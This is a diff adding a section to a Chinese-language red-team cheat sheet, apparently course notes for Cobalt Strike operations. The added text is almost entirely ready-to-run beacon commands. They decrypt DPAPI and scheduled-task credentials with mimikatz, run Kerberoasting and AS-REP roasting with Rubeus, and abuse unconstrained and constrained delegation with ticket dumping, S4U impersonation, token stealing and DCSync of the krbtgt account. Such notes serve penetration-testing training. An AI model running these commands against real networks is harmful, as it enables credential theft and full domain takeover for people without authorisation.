@@ -205,3 +205,128 @@ msf6 exploit(multi/handler) > run
 beacon> spawn msf
 ```
 在 msf 中即可收到会话
+
+
+#### 解密
+-  解密DPAPI
+```bash
+(枚举用户的 vault)
+1) beacon> run vaultcmd /list  
+2) beacon> execute-assembly C:\Tools\Seatbelt.exe WindowsVault (枚举用户的 vault)
+
+(加密凭证存储位置)
+1) beacon> ls C:\Users\[username]\AppData\Local\Microsoft\Credentials  
+2) beacon> execute-assembly C:\Tools\Seatbelt.exe WindowsCredentialFiles
+
+(获取加密秘钥, 请求key)
+1) beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-xxxxxx 
+	# 类似于 'bfc5090d-22fe-4058-8953-47f6882f549e' 就是
+beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-xxxxxx\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
+2) beacon> mimikatz !sekurlsa::dpapi  (如果最近有访问/解密解密, 就会留下缓存, MasterKey)
+
+(解密 blob)
+beacon> mimikatz dpapi::cred /in:C:\Users\[username]\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
+```
+
+- 解密计划任务凭据
+```bash
+(定位blob)
+beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials  
+
+(查看guidMasterKey)
+beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
+
+(转储缓存的 key, 记得对应GUID=guidMasterKey)
+beacon> mimikatz !sekurlsa::dpapi
+
+(解密)
+beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
+```
+
+
+#### kerberos 攻击
+- GetUserSPNs.py (Kerberoasting)
+```
+beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /simple /nowrap
+然后john the hash
+
+(可选，枚举设置了 SPN 的域用户)
+beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName  
+beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /user:mssql_svc /nowrap
+```
+
+- ASREP Roasting
+```
+beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
+beacon> execute-assembly C:\Tools\Rubeus.exe asreproast /user:squid_svc /nowrap
+```
+
+##### [!] 约束委派攻击
+- **无(非)约束委派**
+非约束委派：当 `user` 访问 `service1` 时，如果 `service1` 的服务账号开启了 `unconstrained delegation`（非约束委派），则当 `user` 访问 `service1` 时会将 `user` 的 `TGT` 发送给 `service1` 并保存在内存中以备下次重用，然后 `service1` 就可以利用这张 `TGT` 以 `user` 的身份去访问域内的任何服务（任何服务是指 `user` 能访问的服务）
+```
+beacon> execute-assembly C:\Users\13461\Desktop\KALI_Tools\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage （查找缓存是否有TGT的krbtgt)
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap (提取TGT并利用)
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
+beacon> steal_token 1540
+```
+
+强制计算机帐户对这台计算机进行远程身份验证来获取计算机的 TGT
+```
+beacon> execute-assembly C:\Tools\Rubeus.exe monitor /interval:10 /nowrap  (监控缓存所有新的TGT)
+beacon> execute-assembly C:\Tools\SharpSpoolTrigger.exe 目标domain 攻击(监听)domain  
+```
+
+- **约束委派**
+S4U2Self：   允许服务代表用户获取其自身的 TGS
+S4U2Proxy：允许该服务代表用户为第二个服务获取 TGS
+
+通过允许约束委派的用户 , 就可以模拟域内任意用户获取 TGS 票据( .kirbi File ), 并注入到会话, 访问资源等
+```
+(查找拥有约束委派的计算机用户)
+beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
+
+AdFind.exe -h 10.10.10.8 -u redteam-iis -up Server12345 -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
+
+(利用 kekeo 请求该用户的 TGT)   (!! 也可以跳转到rubeus方法 !!)
+kekeo.exe 
+tgt::ask /user:redteam-iis /domain:redteam.red /password:Server12345 [/ticket:administrator.kirbi]
+	/user: 服务用户的用户名 
+	/password: 服务用户的明文密码 
+	/domain: 所在域名
+	/ticket: 可选参数，指定文件名，可能没用
+
+(使用这张 TGT 通过伪造 s4u 请求以 administrator 用户身份请求访问 DOMAIN CIFS的 ST)
+tgs::s4u /tgt:TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/AD-2008.redteam.red
+
+_____________________________________________
+* 使用 Rubeus.exe: (举例为 sql-2$ 设定为拥有约束委派的权限)
+
+(需要获得受信任的约束委派账户的TGT)
+beacon> execute-assembly C:\Tools\Rubeus.exe triage (查询否有那个账户的TGT, Service一般是 krbtgt/DOMAIN)
+(如果拥有用户的明文密码或者hash ， 也可以使用asktgt请求TGT)
+
+(获取TGT, Base64EncodedTicket)
+beacon> execute-assembly C:\Tools\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+
+(执行S4U获取模拟用户的服务的TGS)
+# beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:admin /msdsspn:cifs/DOMAIN_FQDN /user:sql-2$ /ticket:doIFLD[...]MuSU8= /nowrap
+#    /impersonateuser 是要模拟的用户
+#    /msdsspn 是允许约束委派用户委托的服务主体名称， 可以改为LDAP
+#    /user 是允许执行委托的主体，就是允许约束委派的用户
+#    /ticket 是 /user 的 TGT(Base64EncodedTicket)
+(优先选择请求LDAP的TGS) (对于域控制器)
+* beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:admin /msdsspn:cifs/DOMAIN_FQDN /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap
+
+(使用 S4U2Proxy 票证传递到新的会话中)
+beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:admin /password:FakePass /ticket:doIGaD[...]ljLmlv
+beacon> steal_token 5540 (偷窃刚刚创建的ProcessID)
+
+(验证可用性)
+# beacon> ls \\DOMAIN\c$   (!注意使用 FQDN，不然报错)
+* beacon> dcsync DOMAIN_FQDN DEV\krbtgt  (对于域控制器)
+```
+
+- **基于资源的约束委派**
